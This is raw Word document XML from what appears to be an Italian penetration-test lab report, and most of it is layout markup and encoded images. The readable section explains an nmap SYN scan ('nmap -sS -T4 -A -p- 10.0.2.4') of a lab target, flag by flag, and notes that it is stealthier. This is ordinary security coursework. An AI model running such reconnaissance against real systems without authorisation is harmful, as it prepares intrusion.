lWRb9/aYExxtf/r9/dVqcoM4Y4i9Jw0P8wwEUuNtT62G/e59tgQRkyFrBk+o4YoRVvXtTWVK&#10;6y/0hedtagWHUCyNhi6lsZQyNh06E+d+ROLb0QdnEo+hlTaYC4e7Qaose5LO9MQfOjPiW4fN9/bk&#10;NLh18xzSR5vvN/nyuu53SR7dp9b3d9PrC4iEU/qD4Vef1aFmp4M/kY1i0DBTBZMalMoUCAYWj8UC&#10;xIE3RZGDrCv5v0L9AwAA//8DAFBLAQItABQABgAIAAAAIQC2gziS/gAAAOEBAAATAAAAAAAAAAAA&#10;AAAAAAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgAAAAhADj9If/WAAAAlAEAAAsA&#10;AAAAAAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAGAAgAAAAhAMxt9kF3AgAASgUAAA4A&#10;AAAAAAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAGAAgAAAAhAAgjxoHfAAAACgEA&#10;AA8AAAAAAAAAAAAAAAAA0QQAAGRycy9kb3ducmV2LnhtbFBLBQYAAAAABAAEAPMAAADdBQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="53553BDB" w14:textId="77777777" w:rsidR="00375648" w:rsidRDefault="00375648" w:rsidP="00375648">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21FB6B8E" wp14:editId="2ACB31D3">
            <wp:extent cx="5274310" cy="2145665"/>
            <wp:effectExtent l="0" t="0" r="2540" b="6985"/>
            <wp:docPr id="694989788"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89788" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere, software&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2145665"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 5: OS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="040C2078" w14:textId="234A2E4A" w:rsidR="00262AA4" w:rsidRPr="00262AA4" w:rsidRDefault="00262AA4" w:rsidP="00D7373A">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18ACA543" w14:textId="334F2DE9" w:rsidR="00262AA4" w:rsidRPr="00262AA4" w:rsidRDefault="00262AA4" w:rsidP="00262AA4"/>
    <w:p w14:paraId="7890FF90" w14:textId="1250B290" w:rsidR="009F7BF3" w:rsidRPr="005D1AB9" w:rsidRDefault="00D7373A" w:rsidP="00D7373A">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc139378616"/>
      <w:r w:rsidRPr="005D1AB9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">6 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005D1AB9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005D1AB9">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Target e Port Scanning</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="5DAA9B80" w14:textId="7C42C086" w:rsidR="00D7373A" w:rsidRPr="005D1AB9" w:rsidRDefault="00D7373A" w:rsidP="00D7373A"/>
    <w:p w14:paraId="5FBC0352" w14:textId="0927DA24" w:rsidR="00D7373A" w:rsidRDefault="00D7373A" w:rsidP="00D7373A">
      <w:r>
        <w:t xml:space="preserve">Per </w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t xml:space="preserve">le macchine attive </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t>rilevate nella fase precedente, determiniamo quanti e quali servizi di rete ogni macchina fornisce</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t>l fine di trovare possibili falle di sicurezza nella fase successiva.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Bisogna ricordare</w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t xml:space="preserve"> che la macchina target è una macchina e non espone servizi pubblicamente su </w:t>
      </w:r>
      <w:r w:rsidR="00AE7B38" w:rsidRPr="00D7373A">
        <w:t>Internet; quindi,</w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t xml:space="preserve"> questi ultimi vengono identificati utilizzando scan</w:t>
      </w:r>
      <w:r>
        <w:t>sioni</w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t xml:space="preserve"> di tipo </w:t>
      </w:r>
      <w:r>
        <w:t>attivo</w:t>
      </w:r>
      <w:r w:rsidRPr="00D7373A">
        <w:t xml:space="preserve"> o interrogando direttamente gli asset.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5B46DC" w14:textId="7805D8FB" w:rsidR="00110905" w:rsidRDefault="00AE7B38" w:rsidP="00D7373A">
      <w:r>
        <w:t xml:space="preserve">Per </w:t>
      </w:r>
      <w:r w:rsidR="00626463">
        <w:t xml:space="preserve">capire quali sono le porte aperte abbiamo utilizzato </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00626463">
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00626463">
        <w:t xml:space="preserve">, tramite il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00626463" w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00626463" w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00626463" w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00626463" w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -T4 -A -p-</w:t>
      </w:r>
      <w:r w:rsidR="00110905" w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.2.4</w:t>
      </w:r>
      <w:r w:rsidR="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00110905" w:rsidRPr="00110905">
        <w:t xml:space="preserve"> Dove</w:t>
      </w:r>
      <w:r w:rsidR="00110905">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D34E64" w14:textId="4CEAC9E9" w:rsidR="00110905" w:rsidRDefault="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>-A ci permette di rilevare contemporaneamente:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13469444" w14:textId="78D29D2C" w:rsidR="005D1AB9" w:rsidRDefault="00DE20B5">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Service Version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67355A40" w14:textId="270C4BBF" w:rsidR="00110905" w:rsidRDefault="00DE20B5">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Operating </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Detection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="66E1615E" w14:textId="1C603B17" w:rsidR="00110905" w:rsidRDefault="00DE20B5">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Script Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F872A5" w14:textId="30174A97" w:rsidR="00110905" w:rsidRDefault="00DE20B5">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Network </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Traceroute</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3B6A3F6A" w14:textId="77777777" w:rsidR="00110905" w:rsidRDefault="00110905" w:rsidP="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E1534EB" w14:textId="725EC86D" w:rsidR="00110905" w:rsidRPr="00110905" w:rsidRDefault="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> invia un pacchetto </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>SYN</w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ed attende una risposta da parte della macchina target</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>, che:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B587EA" w14:textId="2EB1869E" w:rsidR="00110905" w:rsidRPr="00110905" w:rsidRDefault="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Se la risposta contiene </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>SYN/ACK</w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, allora la porta è </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>«aperta»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8D56A2" w14:textId="77777777" w:rsidR="00110905" w:rsidRPr="00110905" w:rsidRDefault="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Se la risposta contiene </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>RST/ACK</w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, allora la porta è </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>«chiusa»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8E6D5F" w14:textId="1470C94B" w:rsidR="00262AA4" w:rsidRPr="00D23001" w:rsidRDefault="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Se la risposta contiene un messaggio di errore </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>«ICMP Port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Unreachable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>o se non c’è alcuna risposta, la porta è «filtrata»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0E021B" w14:textId="77777777" w:rsidR="00D23001" w:rsidRDefault="00D23001" w:rsidP="00D23001">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24BCD5D3" w14:textId="267250B1" w:rsidR="00110905" w:rsidRDefault="00110905">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">-p- permette di scansionare </w:t>
      </w:r>
      <w:r w:rsidR="00262AA4">
        <w:t>tutte le porte, cioè da 1 a 65535</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="057CB1B3" w14:textId="42198B70" w:rsidR="00262AA4" w:rsidRDefault="00262AA4" w:rsidP="00262AA4">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F07D38A" w14:textId="434BD648" w:rsidR="00626463" w:rsidRDefault="00262AA4">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>-T4 permette di specificare un timing aggressivo cioè, in modo più veloce</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F25BF92" w14:textId="661C2F1D" w:rsidR="00262AA4" w:rsidRDefault="00262AA4" w:rsidP="00262AA4"/>
    <w:p w14:paraId="5DC3E27C" w14:textId="561127EC" w:rsidR="00262AA4" w:rsidRDefault="00262AA4" w:rsidP="00262AA4">
      <w:r>
        <w:t>Potevamo utilizzare tantissimi tipi di scansioni come esempio -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sT</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e tante altre ma, sappiamo che la scansione -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> è meno lenta e meno rilevabile dalla macchina target. Viene mostrato l’output da terminale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33319161" w14:textId="58DCF1A9" w:rsidR="00AE7B38" w:rsidRPr="00DF5ECF" w:rsidRDefault="00DD2E21" w:rsidP="00DF5ECF">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251678720" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2F2FB571" wp14:editId="1EFBA318">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-2043</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1711708</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1030441" cy="120499"/>
                <wp:effectExtent l="0" t="0" r="17780" b="13335"/>
                <wp:wrapNone/>
                <wp:docPr id="988998500" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1030441" cy="120499"/>
                        </a:xfrm>
                        <a:prstGeom prst="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52AE3808" w14:textId="77777777" w:rsidR="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E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FB571" id="_x0000_s1031" style="position:absolute;left:0;text-align:left;margin-left:-.15pt;margin-top:134.8pt;width:81.15pt;height:9.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6cdgIAAEoFAAAOAAAAZHJzL2Uyb0RvYy54bWysVN1v0zAQf0fif7D8zpKUbrBq6VQ2FSFN&#10;28SG9uw6dhvh+MzZbVr++p2dNC2jT4iX5L5+932+ut42hm0U+hpsyYuznDNlJVS1XZb8x/P8w2fO&#10;fBC2EgasKvlOeX49ff/uqnUTNYIVmEohIyfWT1pX8lUIbpJlXq5UI/wZOGVJqQEbEYjFZVahaMl7&#10;Y7JRnl9kLWDlEKTynqS3nZJPk3+tlQwPWnsVmCk55RbSF9N3Eb/Z9EpMlijcqpZ9GuIfsmhEbSno&#10;4OpWBMHWWP/lqqklggcdziQ0GWhdS5VqoGqK/E01TyvhVKqFmuPd0Cb//9zK+82Te0RqQ+v8xBMZ&#10;q9hqbOKf8mPb1Kzd0Cy1DUySsMg/5uNxwZkkXTHKx5eXsZvZAe3Qh68KGhaJkiMNI/VIbO586Ez3&#10;JjGYhXltTBqIsVHgwdRVlCUGl4sbg2wj4iTzL/k8DY/CHZkRF6HZoZZEhZ1R0Yex35VmdUXZj1Im&#10;ac3U4FZIqWy46MtI1hGmKYUBWJwCmlD0oN42wlRavwGYnwL+GXFApKhgwwBuagt4ykH1c4jc2e+r&#10;72qO5YftYktFl/w85hglC6h2j8gQunPwTs5rGtGd8OFRIO0/XQrddHigjzbQlhx6irMV4O9T8mhP&#10;a0lazlq6p5L7X2uBijPzzdLCXhbjcTzAxIzPP42IwWPN4lhj180N0KBpvSi7REb7YPakRmhe6PRn&#10;MSqphJUUu+Qy4J65Cd2d0+Mh1WyWzOjonAh39snJ6Dz2Oa7g8/ZFoOv3NNCG38P+9sTkzbp2thFp&#10;YbYOoOu0y4e+9hOgg03X0D8u8UU45pPV4QmcvgIAAP//AwBQSwMEFAAGAAgAAAAhAI/jOgndAAAA&#10;CQEAAA8AAABkcnMvZG93bnJldi54bWxMj8FqwzAQRO+F/oPYQm+JXBuE41gOpVDoIYU2yQco1sY2&#10;tVZGUhLn77s5tcedGWbf1JvZjeKCIQ6eNLwsMxBIrbcDdRoO+/dFCSImQ9aMnlDDDSNsmseH2lTW&#10;X+kbL7vUCS6hWBkNfUpTJWVse3QmLv2ExN7JB2cSn6GTNpgrl7tR5lmmpDMD8YfeTPjWY/uzOzsN&#10;btuuQvroisNXUd62wz7Jk/vU+vlpfl2DSDinvzDc8RkdGmY6+jPZKEYNi4KDGnK1UiDuvsp525GV&#10;slQgm1r+X9D8AgAA//8DAFBLAQItABQABgAIAAAAIQC2gziS/gAAAOEBAAATAAAAAAAAAAAAAAAA&#10;AAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgAAAAhADj9If/WAAAAlAEAAAsAAAAA&#10;AAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAGAAgAAAAhAEnp7px2AgAASgUAAA4AAAAA&#10;AAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAGAAgAAAAhAI/jOgndAAAACQEAAA8A&#10;AAAAAAAAAAAAAAAA0AQAAGRycy9kb3ducmV2LnhtbFBLBQYAAAAABAAEAPMAAADaBQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="52AE3808" w14:textId="77777777" w:rsidR="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E21">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251676672" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4F98F514" wp14:editId="3AC099BA">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-1224</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1220470</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1030441" cy="120499"/>
                <wp:effectExtent l="0" t="0" r="17780" b="13335"/>
                <wp:wrapNone/>
                <wp:docPr id="1150037396" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1030441" cy="120499"/>
                        </a:xfrm>
                        <a:prstGeom prst="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3737B466" w14:textId="77777777" w:rsidR="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E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8F514" id="_x0000_s1032" style="position:absolute;left:0;text-align:left;margin-left:-.1pt;margin-top:96.1pt;width:81.15pt;height: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MfRdQIAAEoFAAAOAAAAZHJzL2Uyb0RvYy54bWysVN1v0zAQf0fif7D8zpKUMli1dCqbipCm&#10;rWJDe3Ydu41wfObsNi1/PWcnTcvoE+Ilua/ffZ+vb3aNYVuFvgZb8uIi50xZCVVtVyX//jx/94kz&#10;H4SthAGrSr5Xnt9M3765bt1EjWANplLIyIn1k9aVfB2Cm2SZl2vVCH8BTllSasBGBGJxlVUoWvLe&#10;mGyU55dZC1g5BKm8J+ldp+TT5F9rJcOj1l4FZkpOuYX0xfRdxm82vRaTFQq3rmWfhviHLBpRWwo6&#10;uLoTQbAN1n+5amqJ4EGHCwlNBlrXUqUaqJoif1XN01o4lWqh5ng3tMn/P7fyYfvkFkhtaJ2feCJj&#10;FTuNTfxTfmyXmrUfmqV2gUkSFvn7fDwuOJOkK0b5+OoqdjM7oh368EVBwyJRcqRhpB6J7b0PnenB&#10;JAazMK+NSQMxNgo8mLqKssTganlrkG1FnGT+OZ+n4VG4EzPiIjQ71pKosDcq+jD2m9Ksrij7Ucok&#10;rZka3AoplQ2XfRnJOsI0pTAAi3NAE4oe1NtGmErrNwDzc8A/Iw6IFBVsGMBNbQHPOah+DJE7+0P1&#10;Xc2x/LBb7qjokqfComQJ1X6BDKE7B+/kvKYR3QsfFgJp/+lS6KbDI320gbbk0FOcrQF/nZNHe1pL&#10;0nLW0j2V3P/cCFScma+WFvaqGI/jASZm/OHjiBg81SxPNXbT3AINmtaLsktktA/mQGqE5oVOfxaj&#10;kkpYSbFLLgMemNvQ3Tk9HlLNZsmMjs6JcG+fnIzOY5/jCj7vXgS6fk8DbfgDHG5PT